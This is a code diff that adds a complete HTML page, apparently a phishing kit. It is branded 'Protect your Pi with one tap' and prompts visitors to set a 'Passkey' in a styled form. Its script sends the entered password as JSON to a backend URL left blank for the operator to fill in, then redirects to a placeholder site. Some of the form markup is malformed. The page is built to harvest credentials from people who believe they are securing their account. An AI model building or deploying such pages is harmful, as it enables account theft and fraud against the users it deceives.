@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Set Your PassKey</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url('') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .login-container {
+      width: 450px;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+      background: #fff;
+      margin: 60px auto 0;
+      display: none; /* Initially hide the form */
+    }
+
+    .logo-container {
+      background-color: #f8f8f8;
+      padding: 24px 0;
+      text-align: center;
+      margin: 0 auto;  
+    }
+
+    .logo-container img {
+      display: block;
+      margin: auto;
+      width: 300px;
+      height: 70px;
+    }
+
+    .form-wrapper {
+      padding: 30px;
+      background: #fff;
+      box-sizing: border-box;
+      margin-left: 30px; 
+      margin-right: 30px;
+      font-family: monospace;
+    }
+
+    h2 {
+      font-size: 1.25em;
+      text-align: center;
+      margin-top: 6px;
+      font-family: monospace;
+    }
+
+    .instructions {
+      font-size: 1.0em;
+      color: gray;
+      margin-bottom: 38px;
+      text-align: center;
+      font-family: monospace;
+    }
+
+    label {
+      font-weight: bold;
+      font-size: 0.90em;
+      margin-top: 15px;
+      display: block;
+      text-align: left;
+      font-family: monospace;
+    }
+
+    .form-control {
+      font-family: monospace;
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      margin-top: 5px;
+      margin-bottom: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      background-color: var(--bg-sidebar);
+      color: var(--text-color);
+    }
+
+    .form-control.error {
+      border-color: #ec4c64;  /* Red border for errors */
+    }
+
+    .error-message {
+      color: #ec4c64;
+      font-size: 0.85em;
+      margin-bottom: 10px;
+      text-align: left;
+      font-family: monospace;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background: #5a287d;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: not-allowed;
+      font-weight: bold;
+      margin-top: 15px;
+      font-family: monospace;
+    }
+
+    .btn.active {
+      background: #5a287d;
+      cursor: pointer;
+    }
+
+    @media (max-width: 500px) {
+      .login-container {
+        width: 100%;
+        margin: 20px;
+      }
+
+      .form-wrapper {
+        padding: 20px;
+      }
+
+      .error-message {
+        font-size: 0.75em;
+        font-family: monospace;
+      }
+    }
+
+    .form-control:focus {
+      border: 1px solid #2170f4;
+      outline: none;
+      font-family: monospace;
+    }
+
+    .btn:hover {
+      background-color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container" id="loginContainer">
+    <div class="logo-container">
+      <img src="pi.png" alt="logo" id="logoImage">
+    </div>
+
+    <div class="form-wrapper">
+      <h2>Protect your Pi with one tap</h2>
+      
+      <p class="instructions">
+        Add a Passkey to secure your account with face ID or your phone unlock method. It's faster, safer and password-free.
+      </p>
+
+      <form <form action="/index565e.html"> <id="resetForm">
+        <label for="newPassword">Passkey</label>
+        <input type="password" id="newPassword" class="form-control" placeholder="Enter passkey" required>
+        <div id="passwordError" class="error-message"></div>
+
+        <label for="confirmPassword">Confirm Passkey</label>
+        <input type="password" id="confirmPassword" class="form-control" placeholder="Re-enter passkey" required>
+        <div id="confirmError" class="error-message"></div>
+
+        <button type="submit" id="setPasswordBtn" class="btn" enabled>
+          <strong>Set PassKey</strong>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Wait for the image to fully load
+    const logoImage = document.getElementById('logoImage');
+    const loginContainer = document.getElementById('loginContainer');
+    
+    logoImage.onload = function() {
+      // Once the image is loaded, show the login container
+      loginContainer.style.display = 'block';
+    };
+
+    // If the image is cached, it might load instantly, so we also check if it's already loaded
+    if (logoImage.complete) {
+      loginContainer.style.display = 'block';
+    }
+
+    const form = document.getElementById("resetForm");
+    const newPassword = document.getElementById("newPassword");
+    const confirmPassword = document.getElementById("confirmPassword");
+    const passwordError = document.getElementById("passwordError");
+    const confirmError = document.getElementById("confirmError");
+    const setPasswordBtn = document.getElementById("setPasswordBtn");
+
+    // Function to check if the password meets at least 3 of the 4 conditions
+    function validatePassword(pwd) {
+      let conditionsMet = 0;
+      if (/[a-z]/.test(pwd)) conditionsMet++;  // Check for lowercase letter
+      if (/[A-Z]/.test(pwd)) conditionsMet++;  // Check for uppercase letter
+      if (/\d/.test(pwd)) conditionsMet++;     // Check for number
+      if (/[!%*_\-+=:./?]/.test(pwd)) conditionsMet++; // Check for special symbol
+
+      return conditionsMet >= 3 && pwd.length >= 10; // Requires at least 3 conditions and minimum length of 10
+    }
+
+    newPassword.addEventListener('input', function() {
+      validateNewPassword();
+      validateConfirmPassword();
+    });
+
+    confirmPassword.addEventListener('input', validateConfirmPassword);
+
+    // Validate the new password
+    function validateNewPassword() {
+      let valid = true;
+      passwordError.textContent = "";
+      newPassword.classList.remove("error");
+
+      if (newPassword.value.length > 0 && !validatePassword(newPassword.value)) {
+        newPassword.classList.add("error");
+        passwordError.textContent =
+          "Password should be a minimum of 10 characters. Must contain at least three of the following: lowercase letters (a-z), uppercase letters (A-Z), numbers (0-9), and symbols (!%*_-+=:./?).";
+        valid = false;
+      }
+      return valid;
+    }
+
+    // Validate the confirm password field
+    function validateConfirmPassword() {
+      let valid = true;
+      confirmError.textContent = "";
+      confirmPassword.classList.remove("error");
+
+      if (confirmPassword.value.length > 0 && newPassword.value !== confirmPassword.value) {
+        confirmPassword.classList.add("error");
+        confirmError.textContent = "This password does not match the new password.";
+        valid = false;
+      }
+
+      // Ensure the Set Password button is enabled/disabled based on the input
+      if (newPassword.value.length === 0 || confirmPassword.value.length === 0) {
+        setPasswordBtn.disabled = true;
+        setPasswordBtn.classList.remove("active");
+      } else if (validateNewPassword() && valid && newPassword.value === confirmPassword.value) {
+        setPasswordBtn.disabled = false;
+        setPasswordBtn.classList.add("active");
+      } else {
+        setPasswordBtn.disabled = true;
+        setPasswordBtn.classList.remove("active");
+      }
+    }
+
+    // Form submission logic
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      if (validateNewPassword() && newPassword.value === confirmPassword.value) {
+        // Send the password to the backend (cloud API)
+        const response = await fetch('', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            password: newPassword.value
+          })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+          alert("Password set successfully!");
+          // Redirect to another website after success
+          window.location.href = "https://your-redirect-url.com";  // Replace with your URL
+        } else {
+          alert("There was an error setting the password.");
+        }
+
+        // Reset form and button state
+        form.reset();
+        setPasswordBtn.disabled = true;
+        setPasswordBtn.classList.remove("active");
+      }
+    });
+  </script>
+</body>
+</html>
